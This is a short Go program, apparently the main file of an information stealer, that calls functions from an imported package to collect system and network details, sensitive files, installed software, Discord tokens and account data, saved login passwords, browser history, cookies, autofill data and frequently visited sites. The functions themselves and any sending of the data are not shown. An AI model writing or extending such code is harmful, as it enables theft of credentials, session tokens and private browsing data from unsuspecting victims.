package main

import (
	"github.com/gabrielctz/cmd/scripts"
)

func main() {

	scripts.GetSystemInformation()

	scripts.GetNetworks()
	scripts.GetSensibleFile()
	scripts.GetSoftware()

	tokens := scripts.GetDiscordTokens()

	for _, token := range tokens {
		scripts.GetDiscordInformation(token)
	}

	scripts.GetLoginPass()
	scripts.GetHistory()
	scripts.GetCookies()
	scripts.GetAutoFillData()
	scripts.GetShortcuts()
	scripts.GetTopWebsite()

}
